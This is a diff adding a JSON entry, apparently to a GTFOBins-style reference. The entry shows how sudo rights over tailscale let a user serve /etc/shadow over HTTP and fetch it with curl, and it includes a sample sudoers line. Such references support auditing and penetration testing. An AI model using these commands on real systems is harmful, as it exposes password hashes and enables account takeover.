@@ -1,0 +1,10 @@
+{
+  "functions": {
+    "sudo": [
+      {
+        "description": "If the user can run `/usr/bin/tailscale` as root via `sudo`, they can serve and read any file\naccessible by root. The file becomes reachable via a Tailscale-assigned domain over HTTP.\n\nExample `sudoers` entry:\n```\nray ALL=(ALL) NOPASSWD: /usr/bin/tailscale\n```\n\nExample exploitation:\n```\nsudo tailscale serve --http=8888 /etc/shadow\ncurl http://<hostname>.<tailnet>.ts.net:8888/\n```\n",
+        "code": "sudo tailscale serve --http=8888 /etc/shadow\ncurl http://<hostname>.<tailnet>.ts.net:8888/\n"
+      }
+    ]
+  }
+}
